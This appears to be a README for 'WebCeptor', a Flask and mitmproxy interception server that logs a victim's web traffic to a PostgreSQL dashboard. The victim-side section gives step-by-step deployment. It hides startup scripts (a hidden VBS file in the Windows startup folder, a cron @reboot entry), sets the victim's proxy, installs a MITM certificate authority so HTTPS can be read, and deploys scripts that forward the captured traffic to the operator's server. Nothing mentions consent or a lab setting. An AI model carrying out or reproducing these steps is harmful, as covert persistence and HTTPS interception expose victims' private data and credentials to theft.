# WebCeptor - Network Interception & Logging Server

## Overview
WebCeptor is a Flask-based interception server designed to collect and analyze HTTP request data from a victim's machine running a proxy-enabled application. The system allows real-time monitoring of network traffic and stores logs in a PostgreSQL database.

## Installation & Setup

### Prerequisites
- Python 3.8+
- PostgreSQL Database
- Required Python dependencies (`requirements.txt`)

### Installation Steps
1. **Clone the Repository**  
   ```bash
   git clone https://github.com/ErinFlyingSkyRocket/WebCeptor-Project.git
   cd WebCeptor-Project
   ```

2. **Install Dependencies**  
   ```bash
   pip install -r requirements.txt
   ```

3. **Database Setup**  
   Ensure PostgreSQL is running and properly configured. Modify `config.py` to match your database credentials.

4. **Running the Server**  
   Navigate to the `dashboard` directory and start the Flask server:
   ```bash
   cd dashboard
   python app.py
   ```

5. **Access the Login Page**  
   Open a browser and go to:
   ```
   http://<server-ip>:9090/auth/login
   ```
   This is the authentication page to access logs and dashboard features.

---
## Victim-Side Setup
To capture traffic from a victim's machine, the victim application must be configured to proxy network traffic through `127.0.0.1:8080`.

### **Windows Automatic Startup**
1. Open **Run** (`Win + R`), type `shell:startup`, and press **Enter**.
2. Copy `startup.bat` and `hidden_startup.vbs` to the startup folder to ensure the victim application starts on boot.

### **Linux Automatic Startup**
1. Copy `mitm_startup.sh` to the appropriate startup directory.
2. Ensure it is executable:
   ```bash
   chmod +x mitm_startup.sh
   ```
3. Add it to the system startup:
   ```bash
   crontab -e
   ```
   Add the following line:
   ```
   @reboot /path/to/mitm_startup.sh
   ```

### **Setting Up Victim Proxy**
1. Open **Proxy Settings** on the victim machine.
2. Enable **Use a Proxy Server** and set:
   - **Address:** `127.0.0.1`
   - **Port:** `8080`
3. Click **Save** to apply changes.

### **Modifying the Victim Application**
Before deploying `victim_app.py`, update its configuration:
1. Open `victim_app.py` and `mitm_interceptor.py`, and change the target server IP to your WebCeptor server’s IP or domain.
2. Customize the `DEVICE_ID` of your specified victim in `mitm_interceptor.py`.
3. Deploy the script on the victim's machine.

### **Downloading CA Certificate for HTTPS Interception**
To capture HTTPS traffic, the victim must install the MITM CA certificate:
1. Open a browser on the victim machine.
2. Go to `http://mitm.it`.
3. Download and install the appropriate certificate based on the operating system.
4. Ensure the certificate is trusted in the system settings.

---
## Notes
- The WebCeptor server must be running for interception.
- Proxy settings must remain active for continuous data forwarding.
- Ensure Python is installed on the victim's machine for `victim_app.py` to execute.

---
## Credits
This project utilizes `mitmproxy` for traffic interception and manipulation.  
MITMProxy: [https://mitmproxy.org](https://mitmproxy.org)  
All credit for the proxy engine goes to the `mitmproxy` development team.

